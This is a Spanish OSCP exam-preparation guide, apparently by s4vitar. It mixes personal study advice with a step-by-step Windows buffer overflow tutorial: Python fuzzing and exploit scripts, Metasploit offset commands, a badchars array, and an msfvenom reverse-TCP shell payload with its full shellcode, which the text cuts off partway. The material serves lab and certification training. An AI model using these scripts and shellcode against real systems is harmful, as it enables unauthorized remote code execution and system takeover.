# Preparación para el OSCP (by s4vitar)

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
     * [Fuzzing](#fuzzing)
     * [Calculando el Offset (Tamaño del Búffer)](#calculando-el-offset)
     * [Controlando el registro EIP](#controlando-el-registro-eip)
     * [Situando y Asignando Espacio al Shellcode](#situando-y-asignando-espacio-al-shellcode)
     * [Detectando los Badchars](#detectando-los-badchars)
     * [Generando el Shellcode](#generando-el-shellcode)
     * [Salto al ESP (Mona / Immunity Debugger)](#salto-al-esp)
     * [Mejorando el Exploit](#mejorando-el-exploit)
     * [Reduciendo el Size y Acceso por Powershell](#reduciendo-el-size-y-acceso-por-powershell)
- [Buffer Overflow Linux (No cae en el examen)](#buffer-overflow-linux)
- [Pentesting](#pentesting)
     * [General](#general)
       * [Port Scanning](#port-scanning)
     
Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

Diría que la respuesta es relativa, siempre va a depender de la soltura que tengas con máquinas de tipo _CTF/Challenge_. 

A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a día de hoy, así como **VulnHub** u **OverTheWire**. De hecho, lo que más me sorprendió a la hora de ir haciendo las máquinas del laboratorio fue la gran similitud con las máquinas de HackTheBox. Hablando en términos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegué a leer en su momento en algunos artículos de gente que había pasado con éxito la certificación.

Para que te quedes tranquilo, si juegas mucho con máquinas de tipo CTF y te entrenas día a día con retos desafiantes que te hagan pensar, no tienes de qué preocuparte.

#### ¿Qué plan me pillo?

En mi caso me llegué a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 

Os puedo decir que en 1 mes ya tenía casi todas las máquinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegué a hacer (Eran las más Hard y vi que escapaban demasiado de la metodología del examen).

El segundo mes lo utilicé para seguir con HackTheBox así como para repasar las máquinas hechas y probar vías alternativas de resolver las mismas.

En base a cómo lo he vivido yo, os recomendaría más bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compañero **Julio Ureña**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.

#### ¿Qué bases tuve antes de comenzar con la certificación?

A nivel de Pentesting, en VulnHub tenía 30 máquinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 máquinas con permisos de administrador en cada una de ellas.

A nivel de Sistemas y programación, con muy buenas bases de Linux Avanzado, programación en Bash Avanzado y ligero tanto de Windows como de Python. Sí que es cierto que la certificación me hizo meterme más a fondo con Windows, así como con la programación en Python, de ahí me motivé de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajería instantánea. 

A su vez a esto le sumo las auditorías reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar también en entornos reales me hace ver las cosas desde otra perspectiva.

Por último, a nivel de Búffer Overflow, no sabía hacer nada... entré con la mente en blanco a la certificación. Sin embargo, en 4 días ya sabía hacer todos los ejercicios del laboratorio en base a la guía y a los vídeos de apoyo con los que cuentas en el material que te dan.

#### ¿Qué horarios de estudio seguías?

Esto tal vez ha sido lo más mortal, desafiante, doloroso pero a su vez fructífero. Estuve aplicando **Uberman** durante los 3 meses de preparación, una técnica de sueño polifásico que hace que con tan sólo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).

Decidí aplicarlo porque básicamente el día se pasaba muy rápido, cuando uno está trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demás. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la técnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la mañana.

He de decir que también es un gran puñado de motivación lo que hace que estés dispuesto a hacer esto, en caso contrario ni lo habría intentado. Aún así no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerá de cada cual como pretenda organizarse sus horas de estudio.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

En primer lugar hacerte una cuenta de **HackTheBox**, incluso te diría de pagarte la cuenta VIP para tener acceso a las máquinas retiradas. Tienes a tu disposición canales en Youtube como el de **ippsec**, que te explica paso a paso todas las máquinas retiradas con técnicas bastante chulas tanto de explotación en Windows como en Linux.

Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harán ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las máquinas del laboratorio, te darás cuenta de que los entornos están un poco "deprecated", en el sentido de que son máquinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas máquinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues están pensadas para que practiques distintas vías de explotación con técnicas no tan actuales, lo que hace que ganes más fondo.

#### ¿Qué es lo más duro de la certificación?

La gestión del tiempo. Mi recomendación y por lo que he escuchado de los demás y coincido, es empezar con el Búffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te debería de llevar más de 1 hora.

Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la máquina de 10 puntos, suele ser una explotación rápida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo más recomendable es dedicarle un buen tiempo a la otra máquina de 25 puntos, pues en caso de sacarla, estarías a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarías aprobado (Intenta aspirar a más y hazlas todas :P).

En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilación y ejecución de exploits, pues en la mayoría de las veces te dará una petada de las importantes. Pero no te frustres, siempre con un poco de café y buena actitud se saca.

#### ¿Cuáles son los siguientes pasos?

Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aún me queda un puñado de cosas por aprender. Será cuestión de seguir aprendiendo lo que hará que aparezca una respuesta a esta pregunta.

Sin más, ¡os dejo con toda la preparación del curso!


Buffer Overflow Windows
===============================================================================================================================
A continuación, se listan los pasos a seguir para la correcta explotación de Buffer Overflow en Linux (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.

Servicios/Máquinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio

Generalmente, la metodología a seguir es la que se describe a continuación.

#### Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = ["A"]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) < 30:
  buffer.append("A"*contador)
  contador += 200
  
for strings in buffer:
  try:
    print "Enviando %s bytes..." % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send("USER " + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print "\nError de conexión...\n"
    sys.exit(0)

```
De esta forma, a través de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 

Esto es:

**[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]**

Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.

Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.

Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*900
ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.

Para que te quedes tranquilo, en el examen te entregarán un script en Python a modo de PoC donde se aplica un desbordamiento de búffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuación.

#### Calculando el Offset

Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.

La funcionalidad **pattern_create** nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. 

Ejemplo:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
```

Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo único que tendríamos que hacer es sustituir el caracter "A" de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Lo que conseguimos con esto es determinar a través del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.

Supongamos que el registro **EIP** toma este valor tras la detención del servicio una vez producido el desbordamiento:

**EIP -> 39426230**

A fin de realizar su traducción y ver qué caracteres de nuestro búffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:

```bash
$~ echo "\0x39\0x42\0x62\0x30" | xxd -ps -r

9Bb0

```

Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a través del **pattern_offset** de Metasploit calcular el offset, permitiéndonos así conocer ya el tamaño del buffer previo a la sobreescritura del registro EIP:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0

[*] Exact match at offset 809
```

#### Controlando el registro EIP

Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).

Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(900-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).

Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.

#### Situando y Asignando Espacio al Shellcode

A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.

La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo así), si vemos que el registro **EIP** ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.

Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.

Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(1300-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serán situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.

#### Detectando los Badchars

Esta será la única complicación del examen, y cuando digo complicación la sitúo entre comillas gestualmente hablando. 

A la hora de generar nuestro Shellcode, existen ciertos caracteres que en función del servicio con el que estemos tratando no son aceptados, causando una ejecución errónea de las instrucciones que pretendamos inyectar a nivel de sistema.

Detectar estos caracteres no es nada complejo, lo único que necesitamos es una estructura como la siguiente:

`"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`

A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*809 + "B"*4 + badchars + "C"*(1300-809-4-255)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Desde **Immunity Debugger**, tras la ejecución del script podremos ver una vez se produce el desbordamiento del búfer los valores que están siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquí es caracter que no veamos, caracter que debemos desechar en el envío de nuestros badchars.

Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varían en función del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genérico y siempre debe ser omitido a la hora de generar nuestro Shellcode.

Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo único que nos queda ya es generar nuestro Shellcode. 

#### Generando el Shellcode

El shellcode que se generará a continuación, lo que nos hará será entablar una conexión TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e"
```
Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
